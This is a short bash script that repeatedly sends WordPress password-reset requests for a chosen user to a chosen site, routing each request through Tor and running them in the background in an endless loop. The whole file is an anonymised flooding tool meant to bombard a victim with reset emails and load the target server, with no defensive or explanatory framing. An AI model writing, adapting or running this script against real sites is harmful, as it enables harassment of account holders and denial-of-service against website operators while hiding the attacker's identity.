#!/bin/bash
while true
do
 echo "Requesting another new password for user $2 on $1..."
 torify curl -d "redirect_to=&user_login=$2&wp-submit=Get+New+Password" $1/wp-login.php?action=lostpassword &		
 sleep $3;
done;
